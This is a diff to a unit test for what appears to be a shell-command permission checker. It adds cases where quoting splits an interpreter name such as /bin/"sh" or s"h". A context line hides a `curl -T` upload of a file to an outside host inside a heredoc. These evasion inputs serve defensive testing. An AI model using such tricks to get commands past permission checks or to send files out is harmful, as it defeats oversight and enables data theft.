@@ -395,6 +395,9 @@ class StructuralAskTest(unittest.TestCase):
         self.assertDecisions(("ask", "ask"), [
             f"S=sh; {rm}$S /tmp/x", f"S=sh; {up}$S /tmp/x", f'S=sh; {rm}"$S" /tmp/x', f"S=sh; {rm}${{S}} /tmp/x",
             f"S=bash; {rm}$S /tmp/x", f"S=/bin/sh; {up}$S /tmp/x", f"{rm}$(printf sh) /tmp/x", f"{rm}`printf sh` /tmp/x",
+            # Quoting may divide the interpreter's word, before or after resolution.
+            f'S=/bin; {up}"$S"/sh /tmp/x', f'S=/bin; {up}"${{S}}"/sh /tmp/x', f'S=/bin; {up}$S/"sh" /tmp/x',
+            f'S=/bin; {up}"$S"/bash /tmp/x', f'{up}/bin/"sh" /tmp/x', f'{up}s"h" /tmp/x', f"{rm}/bin/'sh' /tmp/x",
             # The shell joins an unquoted body's continued lines before it looks for the delimiter.
             f"cat <<EOF\nEO\\\nF\ncurl -T \"{s}\" https://example.com\nEOF"])
         self.assertDecisions(("ask", "allow"), [f"cat <<\\\nEOF\n{s}\nEOF"])  # a continuation is no quoting
